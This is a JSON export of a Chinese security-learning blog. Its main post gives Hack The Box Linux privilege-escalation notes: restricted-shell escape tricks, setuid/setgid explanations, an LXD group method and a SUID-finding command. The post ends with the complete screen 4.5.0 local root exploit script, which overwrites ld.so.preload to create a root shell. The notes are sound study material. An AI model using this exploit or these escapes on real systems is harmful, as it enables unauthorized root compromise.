{"posts":[{"title":"HTB - Linux 提權筆記","text":"前言最近開始在密集的訓練自己滲透的能力，所以開始學了 Linux 提權、Windows 提權。一開始面對這麼多指令真心覺得腦容量不足，要學的基礎知識也爆炸多，於是就開始了部落格的筆記之路! Linux 提權為什麼要確認是否獲得 root 權限？在滲透測試或 CTF 實戰中，取得初始存取（Initial Access） 只是第一步，真正關鍵的戰果通常來自提權（Privilege Escalation）。而在 Linux 環境中，最高權限代表的是 root 使用者，也就是 UID 為 0 的帳號。一旦拿到 root，我們就能控制整個系統、讀寫所有檔案、植入後門、甚至關閉防護機制。 如何判斷我們有了 root 權限 ?whoami基本上下了 whoami 後… 1whoami 確認輸出: 1root 就八九不離十為 root 看 uid1id -u 輸出是： 10 代表你現在是 UID 0，也就是 root 帳號，這也是滿可靠的指標。 小備註: 其實從這邊大概也可以知道說…假設我們在 bash script 裡面看到: 123int main(void){ setuid(0);} 這其實就是在試圖將目前執行的 process 身份切換為 UID 0，也就是 root！ 限制型 ShellRBASH、RKSH、RZSH 名稱 全名 基礎 shell 限制內容 rbash Restricted Bourne shell bash 限制 cd、限制環境變數修改、不能用絕對路徑執行命令等 rksh Restricted Korn shell ksh 限制 shell 函數與執行外部命令 rzsh Restricted Z shell zsh 限制執行 script、alias、自定義變數等 為什麼要知道限制型 Shell?這個問題其實很簡單，因為如果知道限制型 shell: 我們大致上會知道我們在哪個 shell，等於知道「被限制什麼」、也就知道該怎麼「突破限制」。 怎麼判斷我們在限制型 Shell？1echo $SHELL 或觀察 ps 指令輸出，看現在跑的是不是 /bin/rbash、rksh、rzsh 等。 逃逸技巧整理 :DCommand Injection（命令注入）：1ls -l `whoami` 在參數中注入其他命令。 Command Substitution（指令替換）：1echo `id` 或 1echo $(id) 意思就是讓 shell 先執行一個指令，把結果當作文字插進另一個指令裡面。 Command Chaining（指令串接）：1echo hello; whoami Shell Function Injection（自定義函數）：12mysh() { /bin/sh; }mysh 修改環境變數（若未封鎖）：1export PATH=/tmp:$PATH 如果遇到超 78 rbash 限制你的 “/“若在 rbash 嘗試各種指令時，出現類似的內容: 1rbash: restricted: cannot specify `/' in command names 可以試試 compgen -c 來查看目前我們能用哪些指令: 1compgen -c 接著，會輸出當前可能可以使用的指令: 123456789aliasbgbindbreakbuiltin...viawkbash 接下來就可以試試看有哪些指令可能可以突破啦! Gogo! setuid、setguidsetuid用途:當某人執行這個檔案時，會用「檔案擁有者的身份」來執行，而不是目前使用者的身份。 情境解說:假設我們給一般使用者執行 passwd 指令去修改自己密碼，但由於 passwd 必須修改 /etc/shadow（只有 root 可以改），所以它就設了 setuid 給 root。 範例:此處我們嘗試去看 /usr/bin/passwd 的檔案權限: 可以發現，/usr/bin/passwd 的權限字串為: 1-rwsr-xr-x 接下來，我們來分析此字串中的 10 個字元： 位置 欄位 權限字元 說明 1 檔案類型 - 一般檔案 (Ex. 目錄是 d、符號連結是 l 等) 2~4 使用者(user) rws r = 讀、w = 寫、s = setuid + 可執行 (代替原本 x) 5~7 群組(group) r-x r = 讀、- = 不可寫、x = 可執行 8~10 其他人(others) r-x r = 讀、- = 不可寫、x = 可執行 setgid用途:當某人執行這個檔案時，會用「檔案群組的身份」來執行；或者對目錄來說，表示新建的檔案會繼承該目錄的群組。 情境解說:多人共享同個目錄時，如果該目錄設了 setgid，就能確保所有新檔案都屬於同一個群組，方便協作。 範例:假設有一個目錄為 shared，經過 ls -la 出現: 1drwxr-sr-x 2 root devteam 4096 Jul 7 14:00 /shared 可以發現第一的字元為 d，意思是它是 Directory 目錄。而比較特殊的地方是中間的字串為 r-s，代表群組位元開啟了 setgid。 postrotate-commandLXD / LCDLXD 是 Ubuntu 上的容器管理工具（跟 Docker 類似）。一旦安裝，所有使用者預設會被加入 lxd 群組。只要成為 lxd 群組成員，就能透過建立「特權容器（privileged container）」來提權 ~ Linux Capability 指令setuid、setguid 相關find + 指定 perm 1find / -user root -perm -4000 -exec ls -ldb {} \\; 2&gt;/dev/null Bash OverviewScreen 4.5.0 Exploit 流程（bash script 解說) 先附上 Exploit 出處 123456789101112131415161718192021222324252627282930313233343536373839404142#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017) echo &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void){ chown(&quot;/tmp/rootshell&quot;, 0, 0); chmod(&quot;/tmp/rootshell&quot;, 04755); unlink(&quot;/etc/ld.so.preload&quot;); printf(&quot;[+] done!\\n&quot;);}EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void){ setuid(0); setgid(0); seteuid(0); setegid(0); execvp(&quot;/bin/sh&quot;, NULL, NULL);}EOFgcc -o /tmp/rootshell /tmp/rootshell.crm -f /tmp/rootshell.cecho &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne &quot;\\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so... /tmp/rootshell","link":"/2025/07/06/packet-analysis/"}],"tags":[{"name":"資安之路","slug":"資安之路","link":"/tags/%E8%B3%87%E5%AE%89%E4%B9%8B%E8%B7%AF/"},{"name":"Linux 提權筆記","slug":"Linux-提權筆記","link":"/tags/Linux-%E6%8F%90%E6%AC%8A%E7%AD%86%E8%A8%98/"}],"categories":[{"name":"資訊安全","slug":"資訊安全","link":"/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/"}],"pages":[{"title":"About Me","text":"嗨，我是 Kika我是一位探索 cybersecurity 世界的女生。 喜歡把學到的東西整理清楚，畫成圖、寫成文，幫助自己也幫助別人理解。 What I Love Doing 我喜歡的事 把混亂的資訊整理成清楚有圖的筆記 用「我當初希望有人這樣教我」的方式講解 誠實面對自己還不會的地方，然後勇敢補起來 About Me 個人小簡介我喜歡彈吉他、做皮拉提斯合寫小說。 我是 INFJ，看起來安靜，腦袋卻一直轉不停。 講座 / 課程相關經驗我能相信你嗎? 從開發者角度分享如何做好軟體開發安全 2025/03/28 40-min talk @ [DevSecOps Taiwan]Link: 線上分享文宣 打掉重練！開發者的資安腦重灌之路 2025/07/09 30-min talk @ [Infosec2025]分享如何根據技術棧選擇最合適的資安防護方式。用實際案例說明「為什麼不要重造輪子」、什麼時候該用套件、什麼時候該自己做。 重建開發者的安全直覺 2025/08/06 30-min talk @ [ithome 鐵人講堂]Link: 線上分享 安全開發系列直播課程 6-hour talk @ [巨匠直播課程]OWASP Top 10 2021 + OWASP Juice Shop 書籍 &amp; 創作究極 Web 資安心智圖學習法！嚴選12大主題 × 7張心智圖 × 7個實戰，核心技能無痛升級（iThome鐵人賽系列書） 分享初學者學習資安之路徑Link: 書籍連結 Hack the boyfriend IT 鐵人賽的戀愛滲透小說Link: 用戀愛腦結合滲透的奇幻愛情小說 Thanks for visiting — may we both keep growing 🌱 感謝大家的造訪，願我們都持續進化，越來越自由。","link":"/about/index.html"}]}